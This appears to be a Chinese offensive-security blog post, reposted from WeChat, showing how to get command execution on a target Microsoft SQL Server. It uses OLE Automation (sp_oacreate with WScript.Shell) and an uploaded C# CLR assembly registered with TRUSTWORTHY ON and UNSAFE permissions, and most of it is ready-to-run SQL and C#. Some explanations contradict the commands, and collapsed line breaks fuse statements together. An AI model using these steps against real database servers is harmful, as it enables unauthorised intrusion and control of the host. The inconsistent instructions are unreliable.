> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/BnFa4f1EKsALxm6N3bNLgw)

文章来源：https://422926799.github.io/posts/639a5410.html
----------------------------------------------------

**利用 COM 执行命令**
---------------

需要开启 Ole Automation Procedures 组件

```
declare @luan int,@exec int,@text int,@str varchar(8000);exec sp_oacreate '{72C24DD5-D70A-438B-8A42-98424B88AFB8}',@luan output;exec sp_oamethod @luan,'exec',@exec output,'C:\\Windows\\System32\\cmd.exe /c whoami';exec sp_oamethod @exec, 'StdOut', @text out;exec sp_oamethod @text, 'readall', @str out;select @str;
```

![](https://mmbiz.qpic.cn/mmbiz_png/ewSxvszRhM7rca8Cm6C4UD2e2YYnPAnctbX5zicoVJ7uMA5e8QjI2eHNBV4tfCrnaWichzYboEj4zh0HdKgobicWg/640?wx_fmt=png)

没有开启 Ole Automation Procedures，可以用下面的命令开启  

```
sp_configure 'show advanced options', 1;GORECONFIGURE;GOsp_configure 'Ole Automation Procedures', 1;GORECONFIGURE;GO
```

**编写 CLR 实现执行命令**
-----------------

编写语言：C#  
Vs 创建类库

```
using System;using System.Collections.Generic;using System.Linq;using System.Text;using System;using System.Threading.Tasks;namespace shellexec{    public class exec    {        public static string cmd(string command)        {            System.Diagnostics.Process pro = new System.Diagnostics.Process();            pro.StartInfo.FileName = "cmd.exe";            pro.StartInfo.UseShellExecute = false;            pro.StartInfo.RedirectStandardError = true; //标准错误            pro.StartInfo.RedirectStandardInput = true; //标准输入            pro.StartInfo.RedirectStandardOutput = true; //标准输出            pro.StartInfo.CreateNoWindow = true; //是否在新窗口开启进程            pro.Start();            pro.StandardInput.WriteLine(command + "&&exit"); //命令参数写入            pro.StandardInput.AutoFlush = true; //缓冲区自动刷新            string output = pro.StandardOutput.ReadToEnd(); //读取执行结果            pro.WaitForExit(); //等待执行完成退出            pro.Close();            return output.ToString();        }    }}
```

生成 dll 后，可以用 hex 的方法写到目标，或者 shell 上传。然后开始构造  
1. 目标数据库实例需要启用 clr 集成

```
exec sp_configure 'clr enabled', 1;--在SQL Server中启用CLRreconfigure;go
```

2. 目标数据库的可信任属性需要设为 false, 可以使用以下语句启用

```
ALTER DATABASE [<数据库名称>] SET TRUSTWORTHY ON
```

3. 在数据库中注册 DLL

```
CREATE ASSEMBLY MySqlCLR FROM '<dll的路径>' //MySqlCLR为导入dll后的变量名称
```

4. 创建函数  
（根据对应函数的类型的参数构造对应的参数类型，然后 RETURNS [nvarchar] (max) 记得设置为返回最大如果是返回 string 类型的话），在直接这个 dll 的名称在那个命名空间、类、函数）

```
CREATE FUNCTION [dbo].[cmd2]  (      @cmd AS NVARCHAR(max))  RETURNS [nvarchar] (max) WITH EXECUTE AS CALLERAS  EXTERNAL NAME [MySqlCLR].[shellexec.exec].cmd //shellexec为命名空间，exec为类名，cmd为函数名GO
```

5. 程序集的权限级别必须设为 external access, 否则在部署的时候会报错

```
ALTER ASSEMBLY [MySqlCLR]WITH PERMISSION_SET = UNSAFE
```

6. 调用存储过程和函数方法

`select [dbo].[cmd2]('whoami')`

![](https://mmbiz.qpic.cn/mmbiz_png/ewSxvszRhM7rca8Cm6C4UD2e2YYnPAncUzlKsFf87iasTFWKwFfAu3P5lHHw9ruT05icR6XfFHKtBrZdAJx09B4w/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/ewSxvszRhM7rca8Cm6C4UD2e2YYnPAncGC45gkJyIbuo55m9mDjicap7OOPTcKfyHiak2icFlB3SIxiama8HUlhzKQ/640?wx_fmt=png)

公众号

最后  

-----

**由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，文章作者不为此承担任何责任。**

**无害实验室拥有对此文章的修改和解释权如欲转载或传播此文章，必须保证此文章的完整性，包括版权声明等全部内容。未经作者允许，不得任意修改或者增减此文章内容，不得以任何方式将其用于商业目的**